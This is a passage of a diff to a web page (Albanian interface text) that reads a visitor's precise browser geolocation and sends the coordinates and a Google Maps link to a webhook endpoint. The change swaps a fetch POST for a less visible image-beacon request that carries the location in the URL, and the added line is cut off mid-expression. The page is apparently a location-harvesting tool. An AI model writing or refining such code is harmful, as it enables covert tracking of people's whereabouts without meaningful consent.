@@ -65,32 +65,5 @@
 
                         statusDiv.innerText = "Duke transmetuar të dhënat...";
 
-                        fetch(webhookEndpoint, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                latitude: lat,
-                                longitude: lon,
-                                maps_url: googleMapsUrl,
-                                timestamp: new Date().toISOString()
-                            })
-                        })
-                        .then(response => {
-                            statusDiv.innerHTML = "<strong style='color: green;'>Vendndodhja u mor dhe u dërgua me sukses!</strong>";
-                        })
-                        .catch(error => {
-                            statusDiv.innerHTML = "<span style='color: red;'>Gabim gjatë dërgimit të të dhënave.</span>";
-                        });
-                    },
-                    function(error) {
-                        statusDiv.innerText = "Qasja u refuzua nga përdoruesi.";
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                statusDiv.innerText = "Shfletuesi juaj nuk e mbështet gjeolokacionin.";
-            }
-        }
-    </script>
-</body>
-</html>
+                        const img = new Image();
+                        img.src = `${webhookEndpoint}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(googleMapsUrl
